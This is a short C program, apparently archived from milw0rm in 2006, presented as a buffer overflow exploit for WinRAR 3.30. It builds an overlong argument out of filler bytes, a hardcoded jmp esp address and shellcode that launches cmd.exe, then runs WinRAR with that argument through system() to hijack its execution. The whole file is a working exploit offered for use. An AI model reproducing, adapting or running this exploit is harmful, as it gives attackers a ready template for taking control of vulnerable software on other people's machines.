/* WinRAR Buffer Overflow 3.30 Exploit
*
* Bug founded by: Vredited By Alpha Programmer & Trap-Set U.H Team
* Exploit made by: K4P0
* Contact: k4p0k4p0@hotmail.com
*/

#include <stdio.h>
#include <windows.h>

int main(void)
{
   char EvilBuff[1024];

   // Normal cmd.exe shellcode.
   char shellcode[] = "\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63"
   		      "\xC6\x45\xF9\x6D\xC6\x45\xFA\x64\xC6\x45\xFB\x2E\xC6"
		      "\x45\xFC\x65\xC6\x45\xFD\x78\xC6\x45\xFE\x65\x8D\x45"
                      "\xF8\x50\xBB\x44\x80\xBF\x77\xFF\xD3";

   char jmpesp_offset[] = "\x0F\x98\xF8\x77";
   char Prog[1024] = "WinRAR ";

   printf("WinRAR Buffer Overflow 3.30 Exploit\n\n");
   printf("Bug discovered by: Vredited By Alpha Programmer & Trap-Set U.H Team\n");
   printf("Exploit made by: K4P0\n");
   memset(EvilBuff, 0x00, 1024);
   memset(EvilBuff, 0x41, 510);
   strncat(EvilBuff, jmpesp_offset, 1024);
   strncat(EvilBuff, shellcode, 1024);
   strncat(Prog, EvilBuff, 1024);
   printf("\nExploiting...\n");
   system(Prog);
   return 0;
}

// milw0rm.com [2006-01-04]
